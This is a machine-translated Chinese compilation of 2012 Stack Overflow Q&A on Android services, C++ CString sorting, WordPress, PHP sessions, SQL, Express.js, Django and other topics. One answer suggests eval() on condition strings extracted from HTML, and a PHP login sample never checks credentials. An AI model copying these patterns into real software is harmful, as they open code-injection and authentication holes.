> 标签：android, service, broadcastreceiver

我制作了一个应用程序来检测我连接到哪个 wifi，并根据它在静音和非静音之间更改声音模式。不过，我想知道，我这样做的方式是否合理。

我把它作为一项服务，因为我希望它一直检查。在服务内部，我在 onStartCommand() 方法中注册了一个广播接收器，并在 onDestroy() 中取消注册它。它不受约束。广播接收器监听连接的变化。

我真正的问题是这是否是一种“经济上”的好方法？还是在服务运行时使用所有电池/内存？

我的（相关）服务源代码：

```
import java.util.ArrayList;
import java.util.List;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.os.Vibrator;
import android.util.Log;
import android.widget.Toast;

public class CheckService extends Service {

public static final String MY_SETTINGS = "MySettings";
private ConnectivityReceiver receiver = null;
public static boolean isRunning = false;
private WifiManager wifi;
private AudioManager audio_mngr;
private SharedPreferences settings;
private List<Network> networks;
private String SSID;

@Override
public IBinder onBind(Intent arg0) {
    // TODO Auto-generated method stub
    return null;
}

@Override
public void onCreate() {
    // TODO Auto-generated method stub
    super.onCreate();
    receiver = new ConnectivityReceiver();
    wifi = (WifiManager)getSystemService(Context.WIFI_SERVICE);
    audio_mngr = (AudioManager) getBaseContext().getSystemService(Context.AUDIO_SERVICE);
    settings = getSharedPreferences(MY_SETTINGS, 0);
    networks = getAllNetworks();
    settings.registerOnSharedPreferenceChangeListener(new OnSharedPreferenceChangeListener(){

        public void onSharedPreferenceChanged(
                SharedPreferences sharedPreferences, String key) {
            networks = getAllNetworks();
        }
    });
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) 
{
    super.onStartCommand(intent, flags, startId);
    registerReceiver(receiver,new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
    isRunning = true;
    return START_STICKY;
}

@Override
public void onDestroy() 
{
    super.onDestroy();

    //Stop the Background thread
    isRunning = false;
    unregisterReceiver(receiver);

    //Announcement about stopping
    Toast.makeText(this, "Stopping the Demo Service", Toast.LENGTH_SHORT).show();
}

public List<Network> getAllNetworks() {
    List<Network> temp = new ArrayList<Network>();
    String[] data = settings.getString("networks", "").split(",");
    if(data.length>1)
    {
        for(int i=1; i<data.length-1; i+=2)
        {
            temp.add(new Network(data[i],data[i+1]));
        }
    }
    return temp;
}

private class ConnectivityReceiver extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent) {
        NetworkInfo info = intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
        if(null != info)
        {
            if(info.getState()==NetworkInfo.State.CONNECTED)
            {
                SSID = wifi.getConnectionInfo().getSSID();
                for(Network n : networks)
                {
                    if(n.getSSID().equals(SSID))
                    {
                        if(n.isQuiet()) setQuiet();
                        else setLoud();
                        break;
                    }
                }
            }
        }
    }
}

private void setQuiet()
{
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        audio_mngr .setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
        v.vibrate(300);
        makeNotification(SSID,"Vibrate mode on!",R.drawable.sound_off);
}

private void setLoud()
{
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        audio_mngr .setRingerMode(AudioManager.RINGER_MODE_NORMAL);
        v.vibrate(300);
        makeNotification(SSID,"Normal mode on!", R.drawable.sound_on);
}

private void makeNotification(String network, String loudness, int icon)
{
    NotificationManager notificationManager = (NotificationManager) 
              getSystemService(NOTIFICATION_SERVICE);

    CharSequence tickerText = "Mode has been changed!";
    long when = System.currentTimeMillis();

    final Notification notification = new Notification(icon, tickerText, when);

    Context context = getApplicationContext();
    CharSequence contentTitle = network;
    CharSequence contentText = loudness;
    Intent notificationIntent = new Intent(this, CheckService.class);
    PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

    notification.setLatestEventInfo(context, contentTitle, contentText, contentIntent);

    final int HELLO_ID = 1;

    notification.flags |= Notification.FLAG_AUTO_CANCEL;
    notificationManager.notify(HELLO_ID, notification);

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:02:46.580

无需长时间运行的服务。

您可以在 AndroidManifest 中设置广播接收器，并在 onReceive(Context context, Intent intent) 方法上完成所有工作。

查看以下文档以了解如何在 AndroidManifest [http://developer.android.com/guide/topics/manifest/receiver-element.html中设置广播接收器](http://developer.android.com/guide/topics/manifest/receiver-element.html)

# c++ - CString 数组排序

> ID：13418372
> 
> 赞同：1
> 
> 时间：2012-11-16T14:16:21.300
> 
> 标签：c++, mfc

我如何对一个数组进行排序（升序或降序）`CString`？我看到了很多对 的引用`std::vector`，但我找不到将 CString 数组转换为向量的示例。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:22:19.700

由于`CString`课程有一个`operator<`你应该能够使用[`std::sort`](http://en.cppreference.com/w/cpp/algorithm/sort)：

```
CString myArray[10];

// Populate array

std::sort(myArray, myArray + 10); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-16T14:37:27.850

假设这`CString`意味着 ATL/MFC `CString`，完整的演示程序**`std::sort`**用于对原始数组进行排序：

```
#include <atlbase.h>
#include <atlstr.h>

#include <algorithm>        // std::sort
#include <iostream>         // std::wcout, std::endl
#include <utility>          // std::begin, std::end

std::wostream& operator<<( std::wostream& stream, CString const& s )
{
    return (stream << s.GetString());
}

int main()
{
    using namespace std;

    CString strings[] = { "Charlie", "Alfa", "Beta" };

    sort( begin( strings ), end( strings ) );
    for( auto&& s : strings )
    {
        wcout << s << endl;
    }
} 
```

使用 a`std::vector`而不是原始数组有点复杂，因为 Visual C++ 的标准库实现还不支持`std::initialiser_list`每个版本 11.0。在下面的示例中，我使用原始数组*来提供数据*（这是将`CString`数组转换为 a 的示例`std::vector`，正​​如您所要求的）。但是可以想象数据可能来自任何来源，例如从文件中读取字符串：

```
#include <atlbase.h>
#include <atlstr.h>

#include <algorithm>        // std::sort
#include <iostream>         // std::wcout, std::endl
#include <utility>          // std::begin, std::end
#include <vector>           // std::vector

std::wostream& operator<<( std::wostream& stream, CString const& s )
{
    return (stream << s.GetString());
}

int main()
{
    using namespace std;

    char const* const stringData[] = { "Charlie", "Alfa", "Beta" };

    vector<CString> strings( begin( stringData ), end( stringData ) );

    sort( begin( strings ), end( strings ) );
    for( auto&& s : strings )
    {
        wcout << s << endl;
    }
} 
```

如您所见，与原始数组相比，`std::vector`is 的*使用方式没有区别。*至少在这个抽象级别上。与原始数组相比，它更安全，功能更丰富。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T15:03:49.113

如果要对 CList 进行排序，可以查看[this](http://www.codeproject.com/Articles/1288/General-Purpose-Collection-Sorter)。

# php - 如何在一个页面中使用 wp_query 三次

> ID：13418373
> 
> 赞同：1
> 
> 时间：2012-11-16T14:16:23.057
> 
> 标签：php, wordpress

我想在页面上显示一些帖子，所以当我使用 wp_query() 如下一个和最后一个不输出任何内容时，为什么？

```
<?php
$my_query = new WP_Query('showposts=1');
while ($my_query->have_posts()) : $my_query->the_post();
?>
<li>.....</li>
<?php endwhile; ?>

<?php
$query = new WP_Query( array( 'post__not_in' => get_option( 'sticky_posts' ) ) );
while ($query->have_posts()) : $query->the_post();
?>
<li>.....</li>
<?php endwhile; ?>

<?php
$query = new WP_Query( array ( 'orderby' => 'rand', 'posts_per_page' => '1' ) );
while ($query->have_posts()) : $query->the_post();
?>
<li>.....</li>
<?php endwhile; ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:22:34.220

因为你经历了整个循环并且没有留下任何帖子。你需要执行`wp_reset_postdata()`.

来自法典：

```
After looping through a separate query, this function restores the $post global 
to the current post in the main query. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:18:51.350

您需要在每次查询后重置发布数据（就在 之后`endwhile`）：

```
<?php wp_reset_postdata();?> 
```

# android - 如何获取已安装的应用程序列表，但不包括系统应用程序？

> ID：13418380
> 
> 赞同：0
> 
> 时间：2012-11-16T14:16:48.703
> 
> 标签：android

> **可能重复：**
> [如何检查应用程序是否是 Android 中的非系统应用程序？](https://stackoverflow.com/questions/8784505/how-do-i-check-if-an-app-is-a-non-system-app-in-android)

目前，此代码返回所有内容，包括 Android 系统和时钟等系统应用程序。

```
public List<ApplicationInfo> getApps() {
        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm
                .getInstalledApplications(PackageManager.GET_META_DATA);
        return packages;
    } 
```

如何区分这些和用户安装的应用程序？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-16T14:19:55.053

您好，您可以使用下面的代码

```
 for(ApplicationInfo app : apps) {
        //checks for flags; if flagged, check if updated system app
        if((app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1) {
            installedApps.add(app);
        //it's a system app, not interested
        } else if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
            //Discard this one
        //in this case, it should be a user-installed app
        } else {
            installedApps.add(app);
        }
    } 
```

# cookies - 通过 Win Store App 的代码为 webview 设置 cookie/header

> ID：13418383
> 
> 赞同：4
> 
> 时间：2012-11-16T14:16:58.703
> 
> 标签：cookies, webview, header, windows-8, microsoft-metro

我想`webview`通过代码为我设置 cookie。我知道这在 Windows Phone 中是不可能的。但是现在可以在 Windows 8 中使用吗？谁能指导我？

替代选项：我可以在 Windows 8 中导航到 URL 时传递标头吗？

在 Windows 手机中

```
 Navigate(URL, [Flags,] [TargetFrameName,] [PostData,] [Headers]) 
```

在 Windows 8 中

```
 Navigate(Uri source) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-23T19:19:25.853

在 Windows 8.1 和 Windows 10 中，您可以执行以下操作：

```
// using Windows.Web.Http;
// using Windows.Web.Http.Filters;

Uri uri = new Uri("http://kiewic.com/your/url/");

HttpCookie cookie = new HttpCookie("fooName", uri.Host, "/");
cookie.Value = "barValue";

HttpBaseProtocolFilter filter = new HttpBaseProtocolFilter();
HttpCookieManager cookieManager = filter.CookieManager;
cookieManager.SetCookie(cookie, false);

MyWebView.Navigate(uri); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-20T14:35:08.743

抱歉，WebView 控件不会为您执行此操作。

您可以使用所需的标头完成您想要创建自定义 WebRequest 的内容，然后使用 WebResponse 的内容调用 WebView.NavigateToString()。

# powershell - 在 Powershell 中使用提示窗口检查错误

> ID：13418385
> 
> 赞同：1
> 
> 时间：2012-11-16T14:17:08.380
> 
> 标签：powershell

以下不起作用。我知道我的写作方式不是最有效的，但我学习 PowerShell 是很困难的。

我试图用这个脚本做的是：

首先，在本地计算机上找到 IP 地址（我没有在此处包含该脚本，但它由 $IPAddress 变量中的“169.254.2.2”表示）

其次，如果 IP 地址有效（即不是 169.254）继续执行脚本（由“Write-Host”表示）。如果它无效，则提示用户以便他们采取行动，然后当他们单击确定时，再次找到 IP 地址并因此循环直到 IP 地址有效。

该脚本一直有效，直到我将 IPAdressCheck 函数放在脚本的该部分周围，然后它什么也不做

```
function IPDialog {

$IPDia= [System.Windows.Forms.MessageBox]::show( "This computer doesn't have a vaild IP Address. 
Please resolve and click OK." , "No Network Connection" , 1 ) 
if ($IPDia -eq "OK" ){IPAddressCheck} 
else
{
exit
}
  }

 function IPAddressCheck{
$IPAddress = "169.254.2.2"
switch ($IPAddress){
    {($_ -like "0.*") -or ($_ -like "169.254.*")} {IPDialog}
    default {write-host 'Continue Script'}
      }

} 
```

欢迎和感激任何指导

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T14:26:44.287

我坐下来思考了一会儿后才开始工作。

这是工作代码，我认为它有效，我只对它进行了部分测试。如果有人希望分享他们对如何改进或改进它的意见，我很乐意听到它，但我很高兴让它发挥作用。

```
function Check-IP
{
$IPSiteAddress = Get-IPAddress
if ($IPSiteAddress -like "0.*" -or $IPSiteAddress -like "169.254.*") {DialogBox-IP}
}

function Get-IPAddress
{
(Get-WmiObject Win32_NetworkAdapterConfiguration |
Where { $_.IPAddress } |
Select -Expand IPAddress).split('.')[0..2] -join '.'
}

function DialogBox-IP
{
$IPDialog = [System.Windows.Forms.MessageBox]::show( "This computer doesn't have a valid IP Address. 
Please correct the IP Address and click OK, or click Cancel to exit.","No Network Connection",1) 
if ($IPDialog -eq "OK") {Check-IP} else {exit}
}

Check-IP
$IPSiteAddress = Get-IPAddress 
```

# mysql - 在同一查询中组合 MySQL AND 和 OR 语句

> ID：13418388
> 
> 赞同：2
> 
> 时间：2012-11-16T14:17:25.380
> 
> 标签：mysql, sql

这是我当前正在运行的查询：

```
$result = R::getAll("SELECT * FROM vw_participantes_curso JOIN vw_cursos ON vw_participantes_curso.id = vw_cursos.id_curso where LEFT(vw_cursos.sigla, 3) = 'ICV' AND RIGHT(vw_cursos.sigla, 3) = '312' AND username = :u", 
    array(':u' => $username)
); 
```

用简单的英语，查询内容如下：

> 给我找一个学生，该学生正在学习以“ICV”开头并以“312”结尾的课程。

现在我需要在同一个查询中添加一个 or 语句，因此它显示为：

> 给我找一个学生，该学生的课程以“ICV”开头，**以**“312”结尾，**并且**（具有roleid 5**或**roleid 15）。

你如何在 MySQL 中格式化这样的嵌套条件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:19:58.583

您可以使用`in`运算符：

```
SELECT * 
FROM vw_participantes_curso 
JOIN vw_cursos 
ON vw_participantes_curso.id = vw_cursos.id_curso 
where LEFT(vw_cursos.sigla, 3) = 'ICV' 
AND RIGHT(vw_cursos.sigla, 3) = '312' 
AND username = :u
AND roleid in (5,15) 
```

或者如果你真的想要`or`运营商：

```
SELECT * 
FROM vw_participantes_curso 
JOIN vw_cursos 
ON vw_participantes_curso.id = vw_cursos.id_curso 
where LEFT(vw_cursos.sigla, 3) = 'ICV' 
AND RIGHT(vw_cursos.sigla, 3) = '312' 
AND username = :u
AND (roleid = 5 or roleid = 15) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:19:39.567

最简单的将是

```
SELECT *
FROM tableName
WHERE columnName LIKE 'ICV%312' AND
      roleID IN (5,15) 
```

# ios - iOS - 内存管理

> ID：13418389
> 
> 赞同：0
> 
> 时间：2012-11-16T14:17:40.627
> 
> 标签：ios, arrays, memory-management

我有一个以这种方式分配的自定义类数组：

```
myArray = [NSMutableArray array]; 
```

我通过 for 循环在其中添加对象：

```
for (CustomClass *obj in otherArray) {
    [myArray addObject:obj];
} 
```

然后，我将所有内容添加到我的视图中：

```
CustomClass *obj = [myArray objectAtIndex:index];
[self.view addSubview:obj]; 
```

每次我在视图中添加元素时，我都会将其从数组中删除：

```
[myArray removeObject:obj]; 
```

最后，我拥有我认为的所有元素。但是，在游戏结束时，我必须从我的视野中删除所有对象并从内存中删除。我使用 ARC。我不知道如何从内存中释放对象。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:31:05.260

您将不得不从它存放的每个地方移除该对象。ARC 将为您处理保留/释放调用（在编译时）在未使用时降至零。您应该注意到，无论释放什么，未引用的对象都将被释放。

所以你只需要记住你的对象在哪里被引用：

## 大批

当您将其添加到 myArray 中时，它会添加 1 以保留计数。

当您删除它时，它会删除 1。

## 看法

当您 addSubview 它添加 1。

当您想从超级视图中删除时，您应该在您的项目上调用 removeFromSuperview 选择器（我想您知道，这不是您的问题）

## 第一个数组

我注意到你的对象总是留在 otherArray 数组中。

# php - 会话不携带多个页面

> ID：13418390
> 
> 赞同：1
> 
> 时间：2012-11-16T14:17:40.993
> 
> 标签：php

检查PHP.php：

```
<?php
    session_start();
    if ($_SESSION['loggedIn'] == "no") {
        echo "not logged in";
    }
    else if ($_SESSION['loggedIn'] == "yes") {
        echo "logged in";
    }
    else if (!isset($_SESSION['loggedIn'])){
        echo "session not set";
    }
?>

<html>

<form id = "form2" method="post" action="checklogin2.php">
    Email:<br />
<input type="text" name="myusername" size = "35"/><br />
    Password:<br />
    <input type="text" name="mypassword" size = "35" /><br />
    <input type="submit" value="Login" /><br />
</form>

</html> 
```

checklogin2.php：

```
<?php
    session_start();
    $_SESSION['loggedIn'] = "yes";
    header("location:checkPHP.php");
?> 
```

我第一次加载页面时，未设置会话。但是当我登录时，假设将其设置为yes，然后将用户重定向回主页。然而，这两次它只是说会话没有设置。所以我想我不确定如何正确设置会话。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:25:08.957

PHP 有可能在标头重定向和脚本退出之前没有机会写入会话信息。尝试这个：

```
 session_start();
 $_SESSION['loggedIn'] = "yes";
 session_write_close();
 header("location:checkPHP.php");  
 exit; 
```

我喜欢`exit`在所有标头重定向之后添加显式，以防脚本在客户端收到标头并逃跑之前有时间做其他事情......

我还看到人们这样做是为了解决这种情况：

```
 session_start();
  $_SESSION['loggedIn'] = "yes";
  session_regenerate_id(true);
  header("location:checkPHP.php"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:31:04.460

为了让 PHP 能够设置会话变量，它必须能够识别客户端，对吗？嗯，用于完成此操作的默认方法是通过在您启动会话时设置的 cookie。由于您似乎正在使用启动会话的同一页面上的 Location 标头将用户重定向到成员的唯一页面，因此不会设置 PHPSESSID cookie。因此，一旦用户到达会员的唯一页面，PHP 将无法识别该用户。他们的会话变量仍然存在，但 PHP 不会把它交给陌生人。:)

基本上，在包含 Set-Cookie 标头的 HTTP 响应中，它需要是常规的 200 OK 响应，而不是协议级别的重定向。希望有帮助

# asp-classic - Server.createObject 与 Persist.Mailsender 错误

> ID：13418391
> 
> 赞同：0
> 
> 时间：2012-11-16T14:17:42.290
> 
> 标签：asp-classic, vbscript

我的代码中的这一行有问题`Set Mail = Server.CreateObject("Persits.MailSender")`。这段代码以前可以正常工作。突然之间，它开始抛出一个错误，说明创建对象失败。任何人都可以建议解决方法吗？

```
 Set Mail = Server.CreateObject("Persits.MailSender")" 
                ' enter valid SMTP host
    Mail.Host =  "smtpeu1-css.shell.com"
    Mail.From =  "SHIPLocalHost@shell.com"
    Mail.FromName = "SHIPLocalHost@shell.com"

    Mail.AddAddress  defaultTestEmail, defaultTestEmailName
    'If(len(emailCCEmail)>0)Then
        'Mail.AddAddress   defaultTestEmailCC , defaultTestEmailCCName
    'End If
    Mail.Subject = subject
    Mail.IsHTML = True
    'send an email for SSR
    Mail.Body= mailbody
    'Mail.AddAttachment "C:\Apps\SHIP from PROD\ship\ship\UploadedFiles\" & strFileName
    Mail.AddAttachment FilePath
    Mail.Send 
```

# silverlight-4.0 - Silverlight 4 ip camera 视频播放器或流媒体

> ID：13418392
> 
> 赞同：1
> 
> 时间：2012-11-16T14:17:44.480
> 
> 标签：silverlight-4.0, media-player, mediaelement, ip-camera

我遇到了 ZOT IP 摄像头的问题。我可以在 上播放我的本地网络摄像头`mediaElement`，但我必须从 IP 获取视频。我试图将摄像头 IP 提供给`mediaElement`via，`Uri`但它没有打开。我需要一些帮助来解决这种情况。对 silverlight IP cam、Video streamer 或 silverlight 视频播放器有什么建议吗？

# sql - 如何在 where 条件下使用 VBA 函数？

> ID：13418401
> 
> 赞同：2
> 
> 时间：2012-11-16T14:17:54.537
> 
> 标签：sql, windows, ms-access, vba, ms-access-2010

我在我的 Access 数据库中使用[了](https://stackoverflow.com/questions/4243036/levenshtein-distance-in-excel)Levenshtein 距离。当函数在字段列表中时，在 SELECT 语句中使用函数有效。例如：

```
SELECT field, Levenshtein(field, 'Saturday')
FROM table 
```

`field`文本列在哪里(Access-VarChar)。现在，我想使用 where 子句中的函数作为条件

```
SELECT field, Levenshtein(field, 'Saturday') as distance
FROM table
WHERE (Levenshtein(field, 'Saturday') < 5) 
```

但是 Access 给我的所有错误都是“与类型冲突”。`distance`在 consition 中使用而不是`Levenshtein(field, 'Saturday')`.

levenshtein 函数定义为`Public Function Levenshtein(string1 As String, string2 As String) As Long`。那么我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:02:24.190

我认为您的表中有一些空值。你可以试试这个查询吗？

```
SELECT field, Levenshtein(field, 'Saturday') as distance
FROM table
WHERE (Levenshtein(nz(field, ""), 'Saturday') < 5) 
```

（看起来`where field is not null`您的查询中的条件还不够，无论如何都会尝试评估该函数）

或者您可以将您的`Levenshtein`函数定义为`(string1 as Variant, string2 as Variant)`，并确保在 string1 或 string2 为 null 时返回 null：

```
If IsNull(string1) or IsNull(string2) Then
  Levenshtein = Null
  Exit Function
End If 
```

# c# - TreeNode.NextVisibleNode 坏了？

> ID：13418402
> 
> 赞同：2
> 
> 时间：2012-11-16T14:17:58.550
> 
> 标签：c#, winforms, .net-4.0

我想知道该`TreeNode`属性`NextVisibleNode`是如何在语义上定义的。我注意到它与 a的属性*不*对应。`TreeNode``IsVisible`

考虑 a`Windows.Forms.Form`持有`TreeView`的`TreeNode`s 比它可以在其客户区显示的更多（即出现滚动条）。

当尝试使用以下代码仅迭代`TreeNode`客户区域中可见的那些 s 时...

```
int numVisible = 0;

for (TreeNode node = treeView.TopNode;
     node != null;
     node = node.NextVisibleNode)
{
    // Do something...
    ++numVisible;
} 
```

...实际上*所有* `TreeNode`低于第一个可见的 s`TreeNode`都被计算在内。尽管`TopNode`按预期工作，但必须扩展`for`' 条件以`node != null && node.IsVisible`迭代`TreeNode`s 的正确子集。

这种行为是`NextVisibleNode`有意的还是可能是由于错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:14:59.517

看起来它要么是“设计的”，要么是一个错误。但听起来你的检查`IsVisible`方法是要走的路：

[TreeNode.NextVisibleNode 必须返回什么](http://social.msdn.microsoft.com/Forums/en/winforms/thread/1002b7e8-6e0e-4493-874a-0245e9167e13)

可能是`NextVisibleNode`指扩展状态（即未扩展的子节点不计为可见），但不是实际`IsVisible`属性。这就是我在有限测试中看到的行为。这似乎是唯一使它与`NextNode`

# javascript - 在 express.js 中循环遍历 json 数据

> ID：13418403
> 
> 赞同：1
> 
> 时间：2012-11-16T14:17:58.377
> 
> 标签：javascript, json, node.js, express

我试图循环一个 json 文件并挑选出每一集，但我很困惑我的循环只输出第一个`current_episode`，如果有人能检查我的问题，非常感谢！

```
app.get('/episodes', function(req, res){
    fs.readFile('channels.json', 'utf8', function (err, data) {
        var jsondata = JSON.parse(data);
        for (var i=0; i<jsondata.channels.length; i++){
            var myChannel = jsondata.channels[i].current_episode;
            res.send(myChannel);
        }
    })
}); 
```

我的json数据：

```
{
  "total": 70,
  "request_uri": "\/channels\/",
  "channels": [
    {
      "channel_id": 42,
      "current_episode": [
        {
          "id": 126248,
          "title": "Spanarna",
        }
      ]
    },
    {
      "channel_id": 43,
      "current_episode": [
        {
          "id": 126255,
          "title": "Beck: I stormens \u00f6ga",
        }
      ]
    },
............
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-16T14:23:16.900

`res.send`写入数据并结束请求。试试这个：

```
app.get('/episodes', function(req, res){
    fs.readFile('channels.json', 'utf8', function (err, data) {
        var jsondata = JSON.parse(data);
        res.writeHead(200, {'Content-Type': 'text/plain'});
        for (var i=0; i<jsondata.channels.length; i++){
            var myChannel = jsondata.channels[i].current_episode;
            res.write(JSON.stringify(myChannel));
        }
        res.end();
    })
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:24:11.343

尝试构建一系列剧集。

```
app.get('/episodes', function(req, res){
    fs.readFile('channels.json', 'utf8', function (err, data) {
        var jsondata = JSON.parse(data),
            myChannel = [];
        for (var i=0; i<jsondata.channels.length; i++){
            myChannel.push( jsondata.channels[i].current_episode );
        }
        res.send( myChannel.join("\n") );
    })
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:30:01.457

**因为你在**循环中有 res.send(myChannel) 。res.send 正在发送找到的第一个通道，并忽略对 res.send() 的下一次调用。

**取而代之的是，您应该将所有通道连接成一个字符串并在循环外**发出 res.send(allChannels) 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-23T22:39:19.573

我发现最简单的方法是：

您可以尝试以下操作，但它也会将所有键加载到内存中

```
Object.keys(o).forEach(function(key, index, originalObject) {
  var val = o[key];
  logic();
}); 
```

然而，由于 Object.keys 是一种本机方法，它可能允许更好的优化。

虽然这是我一直都会做的代码，但我在这里找到了这个（稍微透明的代码），同时检查这是否是做事的最佳方式：[迭代 node.js 中的对象键](https://stackoverflow.com/questions/7440001/iterate-over-object-keys-in-node-js)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-04-29T07:27:35.960

```
function search_items( args ) { 
if ( args ) {       
    string = args.toLowerCase().replace(/"/g, "").replace(/'/g, "").split(" ");
    for ( var i=0, j=0; i<string.length; i++ ) {        
    (function(i){           

        vocabulary.findOne({word:string[i]}, function(error, search){ // find vocabulary info

        if ( !error && search ) {
j++;
        pages.findOne({voc_id:ObjectID(search._id)}, function(error, pages){ // find pages info

            if ( !error && pages ) {

            page_tokens.findOne({page_id:ObjectID(pages._id), voc_id:ObjectID(search._id)}, function(error, page_token){ // find page tokens info

                if ( !error && page_token ) {

                pos_tags.findOne({_id:ObjectID(page_token.pos_tag_id)}, function(error, pos_tag){ // find pos_tags info

                    if ( !error && pos_tag ) {

                    resultTotal.push({vocabulary:search.word, pages:{doc:pages.base_url+pages.path}, page_tokens:{sentence_number:page_token.sentance_number,token_position: page_token.token_position}, pos_tags: { tag:pos_tag.tag } });
                    j--;
                    console.log(j);
                    if ( j==0 ) {

                        res.json({success:resultTotal});

                    }

                    } else {
                    res.json({ error:true });                       
                    }           

                });

                } 

            });             
            }           
        });         
        }           
    });     
    })(i)       
    }
} 
} 
```

# python - 获取 Django 模型的主要字段的名称

> ID：13418405
> 
> 赞同：45
> 
> 时间：2012-11-16T14:18:02.693
> 
> 标签：python, django, django-models

在 Django 中，每个模型都有一个伪属性`pk`，它指向声明为主键的字段。

```
class TestModel(models.Model):
    payload = models.Charfield(max_length=200) 
```

在这个模型中，`pk`属性将指向隐含`id`字段，如果没有字段被声明为主要字段，则生成该字段。

```
class CustomPK(models.Model)
    primary = models.CharField(max_length=100, primary=True)
    payload = models.Charfield(max_length=200) 
```

在此模型中，`pk`属性将指向显式定义的主键字段`primary`

所以我的问题是，我怎样才能得到字段的名称，即主键？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-11-16T14:59:32.467

您还将在 pk 属性上拥有一个属性“名称”。这似乎持有该领域的名称。

```
CustomPK._meta.pk.name 
```

在我的情况下，我得到值“id”作为结果（就像它应该的那样）。:-)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-16T14:36:11.940

[字段](https://github.com/django/django/blob/master/django/db/models/fields/__init__.py#L90)对象有一个`primary_key`属性

```
for field in CustomPK._meta.fields:
  print field.primary_key
  print field.name

# True
# primary
# False
# payload 
```

# c# - 匹配收集超时

> ID：13418406
> 
> 赞同：2
> 
> 时间：2012-11-16T14:18:07.547
> 
> 标签：c#, regex, timeout

我在解析为 html 时使用 matchcollection。但这个解决方案需要很长时间，有时会失败。我在想，如果我设置 matchcollection 超时，这个麻烦就会解决。如何设置 matchcollection 的超时？（框架 4.0）

```
anchorPattern[0]="<div.*?class=\"news\">.*?<div.*?class=\".*?date.*?\">(?<date>.*?)?</div>.*?<a.*?href=\"(?<link>.*?)\".*?>(?<title>.*?)?</a>.*?<(span.*?class=\".*?desc.*?\">(?<spot>.*?)?</span>)?"
    MatchCollection mIcerik = Regex.Matches(html, anchorPattern[i], RegexOptions.Compiled);
    if (mIcerik.Count > 0)
          ListDegree.Add(i,mIcerik.Count); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-08T19:42:30.250

您的正则表达式太多了`".*?"`，对于您的某些输入，可能的组合数量可能接近“无限”。尝试改用原子组`"(?>.*?)"`，以自动丢弃组内任何标记记住的所有回溯位置。这至少会使所有正则表达式解析花费有限的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-01T02:23:09.417

```
TimeSpan timeout = new TimeSpan(0, 1, 0);

anchorPattern[0]="<div.*?class=\"news\">.*?<div.*?class=\".*?date.*?\">(?<date>.*?)?</div>.*?<a.*?href=\"(?<link>.*?)\".*?>(?<title>.*?)?</a>.*?<(span.*?class=\".*?desc.*?\">(?<spot>.*?)?</span>)?"

MatchCollection mIcerik = Regex.Matches(html, anchorPattern[i], RegexOptions.Compiled,timeout);

if (mIcerik.Count > 0)
      ListDegree.Add(i,mIcerik.Count); 
```

该`Timespan`参数建立一个超时间隔以匹配所有对象。或者您可以使用`Regex.InfiniteMatchTimeout`指示该方法不应超时。 [MSDN 正则表达式.Matches()](http://%20https://msdn.microsoft.com/en-us/library/hh160201(v=vs.110).aspx)

# javascript - 将字符串传递给 If 语句

> ID：13418413
> 
> 赞同：-2
> 
> 时间：2012-11-16T14:18:35.273
> 
> 标签：javascript

是否可以将字符串传递给 if 语句作为创建动态 if 语句的一种方式？一个简化的例子是：

```
var condition = "bool == true";
if(condition) console.log('It is true!); 
```

当然上面的例子是行不通的，因为它总是返回true，因为字符串有内容。有没有办法将条件内容作为实际参数注入到 if 语句中？条件需要采用字符串格式，因为在实际应用程序中，条件将使用正则表达式从现有 HTML 块中提取出来，因此以字符串格式返回。

请只使用香草 javascript。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:20:10.170

```
if(eval(condition)){

    //do something

} 
```

丹尼尔是对的，这是不好的做法。但是通过字符串命名变量也是不好的做法 - 所以一个跟随另一个......

* * *

## 回答 #2

